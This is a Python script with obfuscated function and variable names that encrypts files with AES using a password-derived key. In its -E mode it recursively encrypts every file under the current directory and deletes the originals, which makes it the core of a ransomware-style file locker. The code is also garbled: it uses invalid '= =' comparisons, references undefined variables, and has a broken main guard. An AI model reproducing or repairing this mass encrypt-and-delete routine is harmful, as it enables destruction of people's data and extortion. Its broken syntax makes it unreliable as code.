import os
import sys
import getopt
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
class class1:
    def fonk1(self):
        self.b1 = None
    def fonk2(self, password):
        b2 = SHA256.new(password.encode()).digest()
        self.b1 = b2
    def fonk3(self, data):
        b3 = Random.new().read(AES.block_size)
        b4 = AES.new(self.b1, AES.MODE_CBC, b3)
        b5 = self.fonk5(data)
        b6 = b4.encrypt(b5)
        return b3 + b6
    def fonk4(self, b6):
        b3 = b6[:AES.block_size]
        b4 = AES.new(self.b1, AES.MODE_CBC, b3)
        b7 = b4.decrypt(b6[AES.block_size:])
        return self.fonk6(b7)
    def fonk5(self, data):
        b8 = AES.block_size - len(data) % AES.block_size
        b9 = bytes([b8]) * b8
        return data + b9
    def fonk6(self, data):
        b8 = data[-1]
        return data[:-b8]
    def fonk7(self, b12):
        with open(b12, 'rb') as file:
            b10 = file.read()
        b6 = self.fonk3(b10)
        with open(b12 + ".enc", 'wb') as file:
            file.write(b6)
        os.remove(b12)
        print(f"Encrypted {b12}")
    def fonk8(self, b12):
        with open(b12, 'rb') as file:
            b6 = file.read()
        b10 = self.fonk4(b6)
        b11 = b12[:-4]
        with open(b11, 'wb') as file:
            file.write(b10)
        os.remove(b12)
        print(f"Decrypted {b12} to {b11}")
    def fonk9(self, b13):
        for root, b15, filenames in os.walk("."):
            for filename in filenames:
                if filename != sys.argv[0]:
                    b12 = os.path.join(root, filename)
                    if b13 = = "encrypt":
                        self.fonk7(b12)
                    elif b13 = = "decrypt" and b12.endswith('.enc'):
                        self.fonk8(b12)
    def fonk10(self):
        b14 = print(b14.strip())
    def fonk11(self):
        try:
            options, b15 = getopt.getopt(sys.argv[1:], "hp:e:d:ED", ["help", "password=", "encrypt=", "decrypt="])
        except getopt.GetoptError as error:
            print(error)
            self.fonk10()
            sys.exit(2)
        for b16, argument in options:
            if b16 in ("-h", "--help"):
                self.fonk10()
                sys.exit()
            elif b16 in ("-p", "--password"):
                self.fonk2(argument)
            elif b16 in ("-e", "--encrypt"):
                self.fonk7(argument)
            elif b16 in ("-d", "--decrypt"):
                self.fonk8(argument)
            elif b16 = = "-E":
                self.fonk9("encrypt")
            elif b16 = = "-D":
                self.fonk9("decrypt")
if b17 = = "__main__":
    b18 = class1()
    b18.fonk11()